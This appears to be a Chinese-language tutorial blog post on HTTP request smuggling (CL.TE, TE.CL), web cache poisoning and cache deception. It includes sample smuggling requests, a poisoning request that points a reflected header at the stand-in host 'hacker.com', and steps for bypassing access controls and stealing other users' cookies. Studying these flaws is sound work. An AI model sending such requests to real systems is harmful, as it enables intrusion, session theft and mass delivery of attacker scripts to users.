---
title: "HTTP请求走私与Web缓存投毒攻击"
date: 2026-06-12T13:23:28+08:00
draft: false
weight: 80
description: "围绕HTTP请求走私与Web缓存投毒攻击相关攻击面与利用路径，分析打点识别、接口枚举、风险链条、日志痕迹与防守处置思路。"
categories: ["安全", "渗透测试"]
tags: ["渗透测试", "漏洞利用", "Web漏洞", "请求走私", "缓存投毒"]
---

# HTTP请求走私与Web缓存投毒攻击

随着微服务架构与 CDN（内容分发网络）、反向代理（如 Nginx, HAProxy）的普及，现代 Web 应用的 HTTP 请求往往需要经过多层节点才能抵达最终的后端服务器。
**HTTP 请求走私（HTTP Request Smuggling, HRS）**与**Web 缓存投毒（Web Cache Poisoning）**正是利用了这些中间节点在解析 HTTP 协议时的微小差异，制造出极具破坏性的安全灾难。

本文将从协议层出发，深度剖析这两大高级协议栈攻击技术的原理与实战利用。

---

## 1. HTTP 请求走私 (HTTP Request Smuggling)

在 HTTP/1.1 协议中，判断请求体的结束有两种方式：
1.  **`Content-Length` (CL)**：通过指定的字节数确定请求体长度。
2.  **`Transfer-Encoding: chunked` (TE)**：分块传输，以 `0\r\n\r\n` 作为请求结束的标志。

**漏洞成因**：当前端反向代理和后端业务服务器对同时包含 CL 和 TE 头的畸形请求处理逻辑不一致时，攻击者可以将一个“走私”的请求隐藏在合法请求中，越过前端的安全校验，直接“塞入”后端服务器的请求队列中。

### 1.1 CL.TE 走私攻击
*   **前端（代理）**：优先处理 `Content-Length`。
*   **后端（应用）**：优先处理 `Transfer-Encoding`。

**攻击构造**：
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
**解析过程**：
1. 前端代理看到 `CL: 13`，将包含 `0\r\n\r\nSMUGGLED` 在内的整个包转发给后端。
2. 后端看到 `TE: chunked`，解析到 `0\r\n\r\n` 时认为第一个请求已结束。
3. 剩下的 `SMUGGLED` 数据被滞留在后端的 TCP 缓冲区。当下一个正常用户发起请求时，`SMUGGLED` 会被拼接在正常用户请求的头部，导致合法用户请求被篡改（如被重定向或越权）。

### 1.2 TE.CL 走私攻击
*   **前端（代理）**：优先处理 `Transfer-Encoding`。
*   **后端（应用）**：优先处理 `Content-Length`。

**攻击构造**：
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST / HTTP/1.1

0

```
**解析过程**：
1. 前端代理处理 TE，读取完整个分块（包括结尾的 `0`）并转发。
2. 后端处理 CL，只读取了前 4 个字节（`12\r\n`）。
3. 剩下的 `GPOST / HTTP/1.1\r\n\r\n0\r\n\r\n` 成为走私请求，污染了下一个用户的连接。

### 1.3 走私漏洞的实战危害
*   **绕过前端 WAF/ACL**：如果前端限制了访问 `/admin`，可以通过走私将请求包装在 `/index` 下，欺骗前端放行，但在后端被解析为对 `/admin` 的请求。
*   **窃取用户凭据**：通过走私一个未闭合的请求，强迫后端将下一个合法用户的 Cookie 和 Header 作为参数附加到走私请求中，并发送到攻击者控制的回显接口。

---

## 2. Web 缓存投毒 (Web Cache Poisoning)

缓存服务器（如 Varnish, Cloudflare, Fastly）通过缓存静态资源或动态页面的响应，极大地提升了访问速度。
**Web 缓存投毒**是指攻击者构造恶意的请求，诱使缓存服务器将恶意的响应内容（如含有 XSS Payload 的页面）缓存下来。随后，所有正常用户访问该页面时，都会直接从缓存服务器收到这个“有毒”的响应。

### 2.1 缓存键 (Cache Key) 与非键输入 (Unkeyed Inputs)
缓存服务器在决定是否返回缓存时，会根据请求的特定部分生成“缓存键”（通常是 `Host` + `URL路径`）。
如果应用将**未被纳入缓存键**的请求头（Unkeyed Inputs，如 `X-Forwarded-Host`, `X-Original-URL`）直接反射到了页面响应中，漏洞便诞生了。

### 2.2 实战投毒场景
假设目标应用会读取 `X-Forwarded-Host` 头来动态生成页面中的 JS 文件路径：
```html
<script src="https://[X-Forwarded-Host的值]/assets/app.js"></script>
```

**投毒攻击链**：
1.  **探测阶段**：攻击者发送请求，并附带未被纳入缓存键的恶意 Header：
    ```http
    GET /home HTTP/1.1
    Host: target.com
    X-Forwarded-Host: hacker.com
    ```
2.  **验证响应**：如果响应页面包含了 `<script src="https://hacker.com/assets/app.js"></script>`，说明可以控制输出。
3.  **实施投毒**：攻击者不断发送上述请求，直到缓存服务器的旧缓存过期，并将这个带有恶意 JS 路径的响应作为新的缓存存储。
4.  **大规模感染**：普通用户访问 `GET /home`（`Host: target.com` 匹配了缓存键），缓存服务器直接将有毒的页面返回给他们。用户的浏览器会去 `hacker.com` 下载并执行恶意的 JavaScript 代码。

### 2.3 缓存欺骗 (Web Cache Deception)
这与投毒不同。缓存欺骗是诱导缓存服务器缓存**敏感的动态页面**。
*   攻击者诱导受害者访问 `https://target.com/profile/settings.css`。
*   服务器的路由配置（如 Nginx）忽略了不认识的 `.css` 后缀，正常返回了受害者的个人隐私页面 `/profile/settings`。
*   但 CDN 缓存服务器看到后缀是 `.css`，认为这是静态资源，于是将其缓存。
*   攻击者随后访问该相同的 `.css` 链接，CDN 就会将受害者的隐私数据吐给攻击者。

---

## 3. 总结

HTTP 请求走私与 Web 缓存投毒是 HTTP 协议解析不一致性引发的两个极端。
走私攻击是在空间上（前端代理与后端服务之间）制造信息差，从而突破边界；而缓存投毒则是在时间上（缓存生存周期内）制造污染，实现零交互的大规模客户端攻击。随着现代 Web 架构愈发复杂，这些协议栈级别的漏洞正逐渐成为红队攻坚战中的杀手锏。